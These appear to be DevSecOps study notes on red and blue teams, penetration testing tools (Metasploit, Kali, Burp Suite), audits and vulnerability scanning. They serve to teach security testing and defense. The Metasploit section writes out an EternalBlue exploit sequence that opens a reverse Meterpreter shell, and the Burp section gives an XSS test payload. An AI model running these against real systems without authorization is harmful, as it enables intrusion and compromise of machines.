#### Red Team vs Blue Team Concepts
##### What are Red Team and Blue Team?
- **Definition**: Red Team and Blue Team represent opposing roles in cybersecurity exercises:
  - **Red Team**: Simulates attackers to identify vulnerabilities and test defenses.
  - **Blue Team**: Defends systems by detecting, responding to, and mitigating attacks.
- **Purpose**: Improves security posture through adversarial simulation and collaboration.

##### Red Team Concepts
- **Objective**: Emulate real-world attackers to breach systems, using tactics, techniques, and procedures (TTPs) like those in MITRE ATT&CK.
- **Key Activities**:
  - Reconnaissance: Gather info (e.g., OSINT, network scanning).
  - Exploitation: Gain access (e.g., exploit vulnerabilities).
  - Persistence: Maintain foothold (e.g., backdoors).
  - Lateral Movement: Escalate and spread (e.g., credential dumping).
- **Example**: Phishing to gain initial access, then exploiting a misconfigured S3 bucket.
- **Mindset**: Think like an attacker—creative, persistent, and stealthy.

##### Blue Team Concepts
- **Objective**: Protect, detect, and respond to threats in real time.
- **Key Activities**:
  - Monitoring: Use SIEM (e.g., Splunk) to watch logs.
  - Incident Response: Contain and remediate (e.g., isolate compromised hosts).
  - Hardening: Patch systems, enforce policies.
- **Example**: Detect a brute-force attack via Wazuh and block the IP with a firewall.
- **Mindset**: Proactive defense—anticipate and outmaneuver attackers.

##### Red Team vs Blue Team in DevSecOps
- **Collaboration**: Red Team tests CI/CD pipelines and apps; Blue Team integrates findings into automation (e.g., policy-as-code).
- **Simulation**: Red Team runs penetration tests; Blue Team monitors runtime with Falco.
- **Feedback Loop**: Red Team identifies a weak auth mechanism; Blue Team enforces MFA in IaC.

##### Comparison
| **Aspect**      | **Red Team**            | **Blue Team**           |
|-----------------|-------------------------|-------------------------|
| **Role**        | Attack simulation       | Defense and response    |
| **Tools**       | Metasploit, Burp Suite  | SIEM, Falco             |
| **Goal**        | Find weaknesses         | Strengthen defenses     |

#### Penetration Testing (Metasploit, Kali Linux, Burp Suite)
##### What is Penetration Testing?
- **Definition**: A controlled process of simulating cyberattacks to identify and exploit vulnerabilities in systems, networks, or applications.
- **Purpose**: Validates security controls and informs remediation.

##### Metasploit
- **Overview**: An open-source penetration testing framework for exploiting vulnerabilities and managing attack sessions.
- **Features**:
  - Exploits: Prebuilt modules for known CVEs.
  - Payloads: Code to execute post-exploitation (e.g., Meterpreter).
  - Auxiliary tools: Scanning, fuzzing.
- **Setup**:
  1. Install: `sudo apt install metasploit-framework` (Kali Linux).
  2. Launch: `msfconsole`.
- **Example (Exploit EternalBlue - MS17-010)**:
  ```bash
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOSTS 192.168.1.10
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST 192.168.1.100
  exploit
  ```
  - Outcome: Gain a Meterpreter shell on a vulnerable Windows host.
- **DevSecOps Use**:
  - Test containerized apps in staging:
    ```bash
    docker run --rm -it metasploitframework/metasploit-framework ./msfconsole
    ```
  - Automate scans in CI/CD to simulate attacks.

##### Kali Linux
- **Overview**: A Linux distribution tailored for security researchers and penetration testers, preloaded with hacking tools.
- **Key Tools**:
  - **Nmap**: Network scanning (`nmap -sV 192.168.1.0/24`).
  - **Aircrack-ng**: Wi-Fi cracking.
  - **Hydra**: Password brute-forcing.
- **Setup**:
  1. Install: Download ISO from `kali.org` and boot via VM/USB.
  2. Update: `sudo apt update && apt upgrade`.
- **Example (Network Recon)**:
  ```bash
  nmap -A -p- 192.168.1.10
  ```
  - Output: Open ports, services, and OS details.
- **DevSecOps Use**:
  - Run Kali in a CI/CD pipeline to scan staging environments:
    ```yaml
    # GitLab CI
    pentest:
      image: kalilinux/kali-rolling
      script:
        - apt update && apt install -y nmap
        - nmap -oA scan staging.example.com
      artifacts:
        paths: [scan.xml]
    ```

##### Burp Suite
- **Overview**: A tool for web application penetration testing, available in Community (free) and Professional editions.
- **Features**:
  - Proxy: Intercepts HTTP/HTTPS traffic.
  - Scanner: Automated vuln detection (Pro only).
  - Repeater: Replays requests with modifications.
- **Setup**:
  1. Install: Download JAR from `portswigger.net/burp`.
  2. Configure: Set browser proxy to `127.0.0.1:8080`.
- **Example (Test XSS)**:
  1. Intercept a login request.
  2. Modify input: `<script>alert('XSS')</script>`.
  3. Forward and observe response.
  - Outcome: Alert pops up if vulnerable.
- **DevSecOps Use**:
  - Automate scans with Burp Enterprise in CI/CD (requires license):
    ```bash
    burp-rest-api --url http://staging.example.com
    ```

##### Best Practices
- Scope tests to avoid unintended damage (e.g., exclude production).
- Use staging environments mirroring production.
- Document findings for Blue Team remediation.

#### Security Audits & Vulnerability Management
##### What are Security Audits & Vulnerability Management?
- **Security Audits**: Periodic reviews to assess compliance, configurations, and security posture.
- **Vulnerability Management**: A continuous process to identify, prioritize, and remediate vulnerabilities.

##### Security Audits
- **Process**:
  1. **Planning**: Define scope (e.g., CI/CD pipeline, Kubernetes cluster).
  2. **Data Collection**: Gather logs, configs, and IaC.
  3. **Analysis**: Check against standards (e.g., SOC2, NIST).
  4. **Reporting**: Document gaps and recommendations.
- **Example (Kubernetes Audit)**:
  ```bash
  kube-bench run --benchmark cis-1.6
  ```
  - Output: "FAIL: PodSecurityPolicy not enabled."
- **Tools**:
  - **Kube-bench**: Kubernetes CIS benchmark.
  - **AWS Trusted Advisor**: Cloud resource checks.
- **DevSecOps Use**:
  - Automate audits in CI/CD:
    ```yaml
    # GitHub Actions
    - name: Kube Audit
      run: kube-bench run --json > audit-report.json
      if: failure()
    ```

##### Vulnerability Management
- **Process**:
  1. **Identification**: Scan for vulns (e.g., Trivy, Nessus).
  2. **Assessment**: Score with CVSS (e.g., 9.8 = Critical).
  3. **Prioritization**: Use risk models (e.g., DREAD).
  4. **Remediation**: Patch or mitigate.
  5. **Validation**: Re-scan to confirm fixes.
- **Example (Container Vuln)**:
  ```bash
  trivy image my-app:latest
  ```
  - Output: "CVE-2023-1234, Severity: CRITICAL."
  - Fix: Update base image (`FROM alpine:3.18` → `FROM alpine:3.19`).
- **Tools**:
  - **Trivy**: Container image scanning.
  - **Nessus**: Network vulnerability scanning.
  - **Dependabot**: Dependency updates (GitHub).
- **DevSecOps Use**:
  - Integrate into CI/CD:
    ```yaml
    # GitLab CI
    vuln_scan:
      stage: test
      script:
        - trivy image --exit-code 1 --severity HIGH,CRITICAL my-app:latest
    ```

##### Best Practices
- Automate vuln scans on every commit/deploy.
- Use Red Team findings to refine vuln management.
- Maintain a vulnerability database (e.g., Jira) for tracking.

### Practical Workflow
1. **Red Team**:
   - Use Metasploit to exploit a staging app.
   - Test web vulnerabilities with Burp Suite.
2. **Blue Team**:
   - Monitor with Falco/SIEM during tests.
   - Harden systems based on findings (e.g., update IAM).
3. **Audits & Vulns**:
   - Run kube-bench for compliance.
   - Scan with Trivy and prioritize CVSS > 7.0 fixes.
4. **DevSecOps**:
   - Automate pentests and audits in CI/CD.
   - Feed results into policy-as-code for enforcement.
